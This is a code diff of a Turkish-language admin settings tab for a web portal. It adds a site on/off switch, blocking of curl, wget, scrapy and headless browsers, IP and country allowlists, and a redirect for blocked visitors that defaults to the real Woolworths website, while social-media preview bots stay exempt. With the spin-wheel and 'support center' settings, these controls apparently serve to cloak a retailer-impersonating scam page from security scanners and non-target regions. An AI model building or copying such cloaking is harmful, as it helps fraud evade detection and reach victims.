@@ -2,12 +2,18 @@
 
 import { useState, useEffect } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
+import { GEO_CONTINENTS, flagEmoji } from "@/lib/geo-countries";
 
 export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
   const [settings, setSettings] = useState<any>(null);
   const [loading, setLoading] = useState(true);
   const [saving, setSaving] = useState(false);
   const [uploading, setUploading] = useState<string | null>(null);
+  const [allowedCountries, setAllowedCountries] = useState<string[]>([]);
+  const [allowedIps, setAllowedIps] = useState<string>("");
+  const [geoRedirectUrl, setGeoRedirectUrl] = useState<string>("https://www.woolworths.com.au");
+  const [blockBots, setBlockBots] = useState<boolean>(false);
+  const [openContinent, setOpenContinent] = useState<string | null>(null);
   const supabase = createBrowserSupabaseClient();
 
   async function compressImage(file: File, opts: { maxWidth: number; maxHeight: number; quality: number }) {
@@ -50,7 +56,18 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
     if (!supabase) return;
     setLoading(true);
     const { data } = await supabase.from("global_settings").select("*").limit(1).single();
-    if (data) setSettings(data);
+    if (data) {
+      setSettings(data);
+      const sc = (data.site_control ?? {}) as Record<string, unknown>;
+      setAllowedCountries(Array.isArray(sc.allowed_countries) ? sc.allowed_countries : []);
+      setAllowedIps(Array.isArray(sc.allowed_ips) ? sc.allowed_ips.join("\n") : "");
+      setBlockBots(sc.block_bots === true);
+      setGeoRedirectUrl(
+        typeof sc.geo_redirect_url === "string" && sc.geo_redirect_url.trim() !== ""
+          ? sc.geo_redirect_url
+          : "https://www.woolworths.com.au",
+      );
+    }
     setLoading(false);
   };
 
@@ -74,8 +91,16 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
       .update({
         logo_url: settings.logo_url,
         bg_url: settings.bg_url,
+        og_image_url: settings.og_image_url,
         portal_name: settings.portal_name,
         support_center_name: settings.support_center_name,
+        site_enabled: settings.site_enabled !== false,
+        site_control: {
+          block_bots: blockBots,
+          allowed_ips: allowedIps.split("\n").map((s) => s.trim()).filter(Boolean),
+          allowed_countries: allowedCountries,
+          geo_redirect_url: geoRedirectUrl.trim() || "https://www.woolworths.com.au",
+        },
         wheel_settings: settings.wheel_settings
       })
       .eq("id", settings.id || "default");
@@ -155,6 +180,177 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
       </div>
 
       <form onSubmit={handleSave} className="space-y-8">
+        {/* ========== SITE KONTROLÜ ========== */}
+        <div className={`p-8 rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
+          <h3 className={`text-lg font-bold mb-8 border-b pb-4 ${darkMode ? 'border-white/10 text-[#EB5E28]' : 'border-gray-200 text-[#EB5E28]'}`}>Site Kontrolü</h3>
+
+          <div className="space-y-6">
+            {/* Site Aç/Kapa */}
+            <div className={`flex items-center justify-between gap-4 rounded-2xl border p-5 ${darkMode ? 'border-white/10 bg-black/20' : 'border-gray-200 bg-gray-50/60'}`}>
+              <div>
+                <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Siteyi Aç / Kapat</label>
+                <p className={`text-[11px] mt-1 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Kapalıyken admin dışındaki tüm ziyaretçiler 503 görür.</p>
+              </div>
+              <div className="flex items-center gap-3">
+                <button
+                  type="button"
+                  onClick={() => setSettings((prev: any) => ({ ...prev, site_enabled: !(prev.site_enabled !== false) }))}
+                  className={`relative inline-flex h-8 w-14 shrink-0 items-center rounded-full transition-colors duration-300 ${settings.site_enabled !== false ? 'bg-green-500' : 'bg-red-500'}`}
+                >
+                  <span className={`inline-block h-6 w-6 transform rounded-full bg-white shadow transition-transform duration-300 ${settings.site_enabled !== false ? 'translate-x-7' : 'translate-x-1'}`} />
+                </button>
+                <div className={`relative flex items-center gap-2 rounded-2xl px-4 py-3 text-sm font-bold ${settings.site_enabled !== false ? (darkMode ? 'bg-green-500/10 text-green-400' : 'bg-green-50 text-green-600') : (darkMode ? 'bg-red-500/10 text-red-400' : 'bg-red-50 text-red-600')}`}>
+                  {settings.site_enabled !== false && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-500 opacity-60"></span>}
+                  <span className={`relative inline-flex rounded-full h-2.5 w-2.5 ${settings.site_enabled !== false ? 'bg-green-500' : 'bg-red-500'}`}></span>
+                  {settings.site_enabled !== false ? "Site AÇIK" : "Site KAPALI (503)"}
+                </div>
+              </div>
+            </div>
+
+            {/* Bot Engelleme */}
+            <div className={`flex items-center justify-between gap-4 rounded-2xl border p-5 ${darkMode ? 'border-white/10 bg-black/20' : 'border-gray-200 bg-gray-50/60'}`}>
+              <div>
+                <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Bot / Tarayıcı Dışı Erişim Engelleme</label>
+                <p className={`text-[11px] mt-1 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>curl, wget, scrapy, headless tarayıcılar ve bilinen zararlı botlar engellenir. Sosyal medya önizleme botları (OG) etkilenmez.</p>
+              </div>
+              <button
+                type="button"
+                onClick={() => setBlockBots((v) => !v)}
+                className={`relative inline-flex h-8 w-14 shrink-0 items-center rounded-full transition-colors duration-300 ${blockBots ? 'bg-green-500' : (darkMode ? 'bg-white/10' : 'bg-gray-300')}`}
+              >
+                <span className={`inline-block h-6 w-6 transform rounded-full bg-white shadow transition-transform duration-300 ${blockBots ? 'translate-x-7' : 'translate-x-1'}`} />
+              </button>
+            </div>
+
+            {/* IP Bazlı Açma */}
+            <div className={`rounded-2xl border p-5 ${darkMode ? 'border-white/10 bg-black/20' : 'border-gray-200 bg-gray-50/60'}`}>
+              <div className="flex items-center justify-between gap-4 flex-wrap">
+                <div>
+                  <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>İzin Verilen IP'ler (IP Bazlı Açma)</label>
+                  <p className={`text-[11px] mt-1 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Her satıra bir IP yazın (örn. 203.0.113.5 veya 203.0.113.*). <b>Boş bırakılırsa tüm IP'lere açıktır.</b> Yerel IP'ler her zaman girer.</p>
+                </div>
+                <span className={`text-xs font-bold px-3 py-1.5 rounded-full ${allowedIps.trim() ? 'bg-[#EB5E28]/15 text-[#EB5E28]' : (darkMode ? 'bg-white/10 text-gray-400' : 'bg-gray-200 text-gray-500')}`}>
+                  {allowedIps.trim() ? `${allowedIps.split("\n").filter((s) => s.trim()).length} IP aktif` : "Kısıtlama yok"}
+                </span>
+              </div>
+              <textarea
+                value={allowedIps}
+                onChange={(e) => setAllowedIps(e.target.value)}
+                rows={3}
+                placeholder={"203.0.113.5\n198.51.100.*"}
+                className={`mt-3 w-full px-4 py-3 rounded-xl text-sm font-mono outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
+              />
+            </div>
+
+            {/* Hedef Ülkeler */}
+            <div className={`rounded-2xl border p-5 ${darkMode ? 'border-white/10 bg-black/20' : 'border-gray-200 bg-gray-50/60'}`}>
+              <div className="flex items-center justify-between gap-4 flex-wrap">
+                <div>
+                  <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Hedef Ülkeler (Geo Filtre)</label>
+                  <p className={`text-[11px] mt-1 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Sadece seçili ülkelerden gelen ziyaretçiler siteye girer. <b>Hiç seçim yoksa tüm ülkelere açıktır.</b></p>
+                </div>
+                <div className="flex items-center gap-2">
+                  <span className={`text-xs font-bold px-3 py-1.5 rounded-full ${allowedCountries.length > 0 ? 'bg-[#EB5E28]/15 text-[#EB5E28]' : (darkMode ? 'bg-white/10 text-gray-400' : 'bg-gray-200 text-gray-500')}`}>
+                    {allowedCountries.length > 0 ? `${allowedCountries.length} ülke aktif` : "Kısıtlama yok"}
+                  </span>
+                  {allowedCountries.length > 0 && (
+                    <button
+                      type="button"
+                      onClick={() => setAllowedCountries([])}
+                      className={`text-xs font-bold px-3 py-1.5 rounded-full transition-colors ${darkMode ? 'bg-red-500/15 text-red-400 hover:bg-red-500/25' : 'bg-red-50 text-red-600 hover:bg-red-100'}`}
+                    >
+                      Tümünü Temizle
+                    </button>
+                  )}
+                </div>
+              </div>
+
+              <div className="mt-4 space-y-2">
+                {GEO_CONTINENTS.map((continent) => {
+                  const continentCodes = continent.countries.map((c) => c.code);
+                  const selectedCount = continentCodes.filter((c) => allowedCountries.includes(c)).length;
+                  const allSelected = selectedCount === continentCodes.length;
+                  const isOpen = openContinent === continent.id;
+                  return (
+                    <div key={continent.id} className={`rounded-xl border overflow-hidden ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
+                      <button
+                        type="button"
+                        onClick={() => setOpenContinent(isOpen ? null : continent.id)}
+                        className={`w-full flex items-center justify-between px-4 py-3 text-sm font-bold transition-colors ${darkMode ? 'hover:bg-white/5 text-white' : 'hover:bg-gray-100 text-gray-800'}`}
+                      >
+                        <span className="flex items-center gap-2">
+                          <svg className={`w-4 h-4 transition-transform ${isOpen ? 'rotate-90' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" /></svg>
+                          {continent.name}
+                          <span className={`text-[11px] font-medium ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>({continentCodes.length} ülke)</span>
+                        </span>
+                        <span className="flex items-center gap-3" onClick={(e) => e.stopPropagation()}>
+                          {selectedCount > 0 && (
+                            <span className="text-[11px] font-bold text-[#EB5E28]">{selectedCount} seçili</span>
+                          )}
+                          <label className="flex items-center gap-1.5 text-[11px] font-medium cursor-pointer" onClick={(e) => e.stopPropagation()}>
+                            <input
+                              type="checkbox"
+                              checked={allSelected}
+                              onChange={(e) => {
+                                if (e.target.checked) {
+                                  setAllowedCountries((prev) => [...new Set([...prev, ...continentCodes])]);
+                                } else {
+                                  setAllowedCountries((prev) => prev.filter((c) => !continentCodes.includes(c)));
+                                }
+                              }}
+                              className="w-4 h-4 accent-[#EB5E28] cursor-pointer"
+                            />
+                            Tümü
+                          </label>
+                        </span>
+                      </button>
+                      {isOpen && (
+                        <div className={`grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1 px-4 pb-4 pt-1 border-t ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
+                          {continent.countries.map((country) => (
+                            <label
+                              key={country.code}
+                              className={`flex items-center gap-2 px-2 py-1.5 rounded-lg text-xs cursor-pointer transition-colors ${allowedCountries.includes(country.code) ? (darkMode ? 'bg-[#EB5E28]/15 text-white' : 'bg-[#EB5E28]/10 text-gray-900') : (darkMode ? 'hover:bg-white/5 text-gray-300' : 'hover:bg-gray-100 text-gray-700')}`}
+                            >
+                              <input
+                                type="checkbox"
+                                checked={allowedCountries.includes(country.code)}
+                                onChange={(e) => {
+                                  if (e.target.checked) {
+                                    setAllowedCountries((prev) => [...prev, country.code]);
+                                  } else {
+                                    setAllowedCountries((prev) => prev.filter((c) => c !== country.code));
+                                  }
+                                }}
+                                className="w-3.5 h-3.5 accent-[#EB5E28] cursor-pointer shrink-0"
+                              />
+                              <span className="text-sm leading-none">{flagEmoji(country.code)}</span>
+                              <span className="truncate">{country.name}</span>
+                            </label>
+                          ))}
+                        </div>
+                      )}
+                    </div>
+                  );
+                })}
+              </div>
+
+              <div className="mt-4">
+                <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Engellenen Ülke Yönlendirme URL'si</label>
+                <input
+                  type="text"
+                  value={geoRedirectUrl}
+                  onChange={(e) => setGeoRedirectUrl(e.target.value)}
+                  placeholder="https://www.woolworths.com.au"
+                  className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
+                />
+                <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                  Seçili olmayan ülkelerden gelen ziyaretçiler bu adrese gönderilir. Sosyal medya önizleme botları ve aktif oturumu olan kullanıcılar bu filtreden etkilenmez.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+
         <div className={`p-8 rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
           <h3 className={`text-lg font-bold mb-8 border-b pb-4 ${darkMode ? 'border-white/10 text-[#EB5E28]' : 'border-gray-200 text-[#EB5E28]'}`}>Marka ve Tasarım</h3>
           
@@ -243,6 +439,29 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
                     }} disabled={!!uploading} />
                   </label>
                 </div>
+              </div>
+            </div>
+
+            <div className="flex gap-5 items-center border-b border-black/5 dark:border-white/5 pb-8">
+              <div className={`w-24 h-24 shrink-0 rounded-2xl border flex items-center justify-center overflow-hidden relative shadow-inner ${darkMode ? 'bg-black/40 border-white/10' : 'bg-gray-100 border-gray-200'}`}>
+                {settings.og_image_url ? <img src={settings.og_image_url} alt="" className="absolute inset-0 w-full h-full object-cover" /> : <span className="text-xs opacity-50 font-medium">OG Yok</span>}
+              </div>
+              <div className="flex-1 space-y-2.5">
+                <label className={`block text-[11px] font-bold opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>OG Görseli (Paylaşım Önizlemesi)</label>
+                <div className="flex gap-3">
+                  <input
+                    type="text"
+                    value={settings.og_image_url || ""}
+                    onChange={e => handleChange("og_image_url", e.target.value)}
+                    placeholder="https://... veya /og-image.jpg"
+                    className={`flex-1 px-4 py-2.5 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
+                  />
+                  <label className={`px-5 py-2.5 rounded-xl font-bold text-sm cursor-pointer transition-all active:scale-95 shadow-sm border ${darkMode ? 'bg-white/10 hover:bg-white/20 border-white/5 text-white' : 'bg-white hover:bg-gray-50 border-gray-200 text-gray-700'}`}>
+                    {uploading === "og_image_url" ? "..." : "Yükle"}
+                    <input type="file" accept="image/*" className="hidden" onChange={e => handleUpload(e, "og_image_url")} disabled={!!uploading} />
+                  </label>
+                </div>
+                <p className={`text-[11px] ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>WhatsApp/Facebook/Telegram link önizlemesinde görünen resim. 1200×630 önerilir.</p>
               </div>
             </div>
 
